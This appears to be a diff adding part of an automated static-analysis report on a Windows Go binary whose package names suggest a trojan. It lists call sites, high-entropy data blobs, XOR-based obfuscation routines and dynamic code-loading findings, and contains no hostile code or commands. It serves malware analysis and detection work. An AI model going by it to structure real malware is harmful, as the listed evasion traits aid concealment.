+    - main.main:0x511a0a call -> runtime.duffzero+0x150 classification=go_runtime_duff_helper
+    - main.main:0x511b0a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - main.main:0x511b8a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - main.main:0x511c0a call -> runtime.duffcopy+0x33a classification=go_runtime_duff_helper
+    - main.main:0x511eaa call -> runtime.duffcopy+0x31e classification=go_runtime_duff_helper
+    - torjanPrefix/pkg.ExecuteTargetProcess:0x4fb76a call -> runtime.duffzero+0x14b classification=go_runtime_duff_helper
+  indirect_calls:
+    - github.com/StackExchange/wmi.(*Client).Query.func1:0x50e4d0 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).Query.func1:0x50e5b4 call r9 [interface_method_or_object_dispatch] evidence=target comes from register R9; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x50d4f2 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x50d665 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x50d6b7 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x50d709 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x50d769 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService:0x50d7bb call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).coinitService.func2:0x50d888 call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+    - github.com/StackExchange/wmi.(*Client).loadEntity:0x50ead8 call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+  suspicious_data_blobs:
+    - blob_0 .data:0x633000 size=0x3000 entropy=7.954 reasons=high_entropy refs=<none>
+    - blob_1 .rdata:0x5ed000 size=0x1000 entropy=5.343 reasons=contains_magic_bytes refs=<none>
+    - blob_2 /19:0x69b000 size=0x32000 entropy=7.952 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_3 /32:0x6ce000 size=0xa000 entropy=7.913 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_4 /65:0x6da000 size=0x6e837 entropy=7.957 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_5 /78:0x749000 size=0x3c000 entropy=7.955 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_6 /90:0x786000 size=0x10000 entropy=7.792 reasons=contains_magic_bytes,high_entropy refs=<none>
+  data_transformers:
+    - github.com/StackExchange/wmi.(*Client).coinitService ops=add,sub,xor confidence=medium sources=<unknown>
+    - github.com/go-ole/go-ole.invoke ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - github.com/StackExchange/wmi.oleInt64 ops=add,sub,xor confidence=medium sources=<unknown>
+    - github.com/go-ole/go-ole.reflectQueryInterface ops=add,sub,xor confidence=medium sources=<unknown>
+    - github.com/StackExchange/wmi.(*Client).Query.func1 ops=add,sub,xor confidence=medium sources=<unknown>
+    - github.com/StackExchange/wmi.(*Client).loadEntity ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - github.com/go-ole/go-ole.(*SafeArrayConversion).ToValueArray ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - main.initCookie ops=add,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - torjanPrefix/pkg.ResolveAndConnect ops=add,rotate,sub,xor confidence=medium sources=<unknown>
+    - torjanPrefix/pkg.parseCustomDomainName ops=add,bytes_to_string,sub,xor confidence=medium sources=<unknown>
+  loader_behaviors:
+    - <reachable_component> kind=dynamic_code_loader confidence=high evidence=dynamic_import_resolution,executable_memory_requested,raw_syscall
+    - github.com/go-ole/go-ole.queryInterface kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/go-ole/go-ole.getIDsOfName kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/go-ole/go-ole.invoke kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/go-ole/go-ole.reflectQueryInterface kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/go-ole/go-ole.(*IEnumVARIANT).Next kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/go-ole/go-ole.(*IUnknown).Release kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - torjanPrefix/pkg.GetRAM kind=dynamic_code_loader confidence=high evidence=dynamic_import_resolution,executable_memory_requested,raw_syscall
